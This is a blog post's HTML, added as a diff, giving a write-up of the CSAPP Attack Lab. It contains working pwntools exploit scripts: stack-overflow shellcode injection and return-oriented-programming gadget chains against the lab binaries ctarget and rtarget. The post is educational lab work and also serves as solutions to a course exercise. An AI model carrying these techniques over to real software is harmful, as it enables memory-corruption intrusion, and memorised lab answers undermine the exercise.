@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="This is the writeup for CSAPP Attacklab Tool: IDA&#x2F;Ghidra, pwndbg, pwntools Part I: Code Injection AttacksLevel 1Simple stack overflow, without the protection of canary and ASLR. Debugger check th">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP attacklab">
+<meta property="og:url" content="https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/index.html">
+<meta property="og:site_name" content="Thomason&#39;s Blog">
+<meta property="og:description" content="This is the writeup for CSAPP Attacklab Tool: IDA&#x2F;Ghidra, pwndbg, pwntools Part I: Code Injection AttacksLevel 1Simple stack overflow, without the protection of canary and ASLR. Debugger check th">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-06-17T04:45:00.000Z">
+<meta property="article:modified_time" content="2022-08-06T21:27:55.628Z">
+<meta property="article:author" content="Thomason Zhao">
+<meta property="article:tag" content="CSAPP Labs">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CSAPP attacklab</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+
+  <!-- fancybox support -->
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+  
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ThomasonZhao">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/08/02/Pwncollege-Summary/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/05/27/CSAPP-bomblab/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&text=CSAPP attacklab"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&title=CSAPP attacklab"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&is_video=false&description=CSAPP attacklab"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CSAPP attacklab&body=Check out this article: https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&title=CSAPP attacklab"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&title=CSAPP attacklab"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&title=CSAPP attacklab"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&title=CSAPP attacklab"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&name=CSAPP attacklab&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&t=CSAPP attacklab"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-I-Code-Injection-Attacks"><span class="toc-number">1.</span> <span class="toc-text">Part I: Code Injection Attacks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1"><span class="toc-number">2.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2"><span class="toc-number">3.</span> <span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3"><span class="toc-number">4.</span> <span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-II-Return-Oriented-Programming"><span class="toc-number">5.</span> <span class="toc-text">Part II: Return-Oriented Programming</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-4"><span class="toc-number">5.1.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-5"><span class="toc-number">5.2.</span> <span class="toc-text">Level 5</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CSAPP attacklab
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Thomason Zhao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-17T04:45:00.000Z" itemprop="datePublished">2022-06-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CSAPP-Labs/" rel="tag">CSAPP Labs</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>This is the writeup for CSAPP Attacklab</p>
+<p>Tool: IDA&#x2F;Ghidra, pwndbg, pwntools</p>
+<h2 id="Part-I-Code-Injection-Attacks"><a href="#Part-I-Code-Injection-Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h2><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>Simple stack overflow, without the protection of canary and ASLR. Debugger check the stack frame, find out that total 40 bytes offset away from the return address. So make a 40 bytes padding then follow the address of touch1. Done</p>
+<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>It checks the argument of touch2 to be the cookie that within the <code>cookie.txt</code> file. The stack is executable, so inject a shellcode into the stack then return to the stack to execute the shellcode to make <code>rdi</code> to be the correct cookie. </p>
+<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>Level 3 require a pointer to check, however, some part of the stack will be wiped out by the function <code>hexmatch</code> and <code>touch3</code>, so store the string in somewhere away from the place they wipe out will be fine. </p>
+<p>Solution for Part I:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.encoding = <span class="string">&quot;latin&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;INFO&quot;</span></span><br><span class="line">warnings.simplefilter(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie = p32(<span class="number">0x59b997fa</span>)</span><br><span class="line">touch1 = p32(<span class="number">0x4017c0</span>)</span><br><span class="line">touch2 = p32(<span class="number">0x4017ec</span>)</span><br><span class="line">touch3 = p32(<span class="number">0x4018fa</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = gdb.debug([&quot;./ctarget&quot;, &quot;-q&quot;])</span></span><br><span class="line">p = process([<span class="string">&quot;./ctarget&quot;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># exp for touch1</span></span><br><span class="line"><span class="comment"># p.sendline(b&quot;A&quot;*40 + touch1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exp for touch2</span></span><br><span class="line"><span class="comment"># shellcode = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     mov rdi, 0x59b997fa</span></span><br><span class="line"><span class="comment">#     push 0x4017ec</span></span><br><span class="line"><span class="comment">#     ret</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># print(len(asm(shellcode)))</span></span><br><span class="line"><span class="comment"># p.sendline(asm(shellcode) + b&quot;A&quot;*27 + p32(0x5561dc78));</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exp for touch3</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rdi, 0x5561dca8</span></span><br><span class="line"><span class="string">    push 0x4018fa</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(shellcode)))</span><br><span class="line">p.sendline(asm(shellcode) + <span class="string">b&quot;A&quot;</span>*<span class="number">27</span> + p64(<span class="number">0x5561dc78</span>) + <span class="string">b&quot;59b997fa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.readall().decode())</span><br></pre></td></tr></table></figure>
+
+<h2 id="Part-II-Return-Oriented-Programming"><a href="#Part-II-Return-Oriented-Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h2><h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><p>Same with Level 2, but with random memory address. So we are unable to access the code that we inject to the stack. The core part on <code>touch2</code> is to make <code>rdi = cookie</code>. With the help of ROPgadgets, we can find from the <code>farm.c</code> that there are two place to reach our goal:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getval_280:</span><br><span class="line">0x4019cc</span><br><span class="line">58 	 	 pop rax</span><br><span class="line">90 	 	 nop</span><br><span class="line">c3 	 	 ret</span><br><span class="line"></span><br><span class="line">setval_426:</span><br><span class="line">at 0x4019c5</span><br><span class="line">48 89 c7 mov rdi, rax</span><br><span class="line">90 		 nop</span><br><span class="line">c3 		 ret</span><br></pre></td></tr></table></figure>
+
+<h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><p>Same thing. Try to make <code>[rdi] = cookie</code>. You may find a gadget in <code>setval_350</code> that store <code>rsp</code> to <code>rax</code>. But the hard thing is that if we place where <code>rsp</code> is pointing to be the cookie value, we are unable to further jump to other places because the cookie take the place that original used for another return address. </p>
+<p>So, in order to bypass this issue, we can add an offset to <code>rsp</code> by <code>add_xy</code> function. So that it will point away from current position and we can store cookie string to other places. </p>
+<p>Solution for Part II:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.encoding = <span class="string">&quot;latin&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;INFO&quot;</span></span><br><span class="line">warnings.simplefilter(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie = p32(<span class="number">0x59b997fa</span>)</span><br><span class="line">touch2 = p32(<span class="number">0x4017ec</span>)</span><br><span class="line">touch3 = p32(<span class="number">0x4018fa</span>)</span><br><span class="line"></span><br><span class="line">p = gdb.debug([<span class="string">&quot;./rtarget&quot;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"><span class="comment"># p = process([&quot;./rtarget&quot;, &quot;-q&quot;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exp for touch2</span></span><br><span class="line"><span class="comment"># p.sendline(b&quot;A&quot;*40 + p64(0x4019cc) + p64(0x59b997fa) + p64(0x4019c5) + p64(0x4017ec));</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exp for touch3</span></span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">40</span> + p64(<span class="number">0x4019cc</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x401a42</span>) + p64(<span class="number">0x401a69</span>) + p64(<span class="number">0x401a27</span>) + p64(<span class="number">0x401a06</span>) + p64(<span class="number">0x4019c5</span>)</span><br><span class="line">        + p64(<span class="number">0x4019d6</span>) + p64(<span class="number">0x4019c5</span>) + p64(<span class="number">0x4018fa</span>) + <span class="string">b&quot;59b997fa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.readall().decode())</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/ThomasonZhao">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-I-Code-Injection-Attacks"><span class="toc-number">1.</span> <span class="toc-text">Part I: Code Injection Attacks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1"><span class="toc-number">2.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2"><span class="toc-number">3.</span> <span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3"><span class="toc-number">4.</span> <span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-II-Return-Oriented-Programming"><span class="toc-number">5.</span> <span class="toc-text">Part II: Return-Oriented Programming</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-4"><span class="toc-number">5.1.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-5"><span class="toc-number">5.2.</span> <span class="toc-text">Level 5</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&text=CSAPP attacklab"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&title=CSAPP attacklab"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&is_video=false&description=CSAPP attacklab"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CSAPP attacklab&body=Check out this article: https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&title=CSAPP attacklab"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&title=CSAPP attacklab"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&title=CSAPP attacklab"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&title=CSAPP attacklab"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&name=CSAPP attacklab&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://thomasonzhao.github.io/2022/06/16/CSAPP-attacklab/&t=CSAPP attacklab"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    Thomason Zhao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ThomasonZhao">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<!-- FancyBox -->
+
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+</body>
+</html>
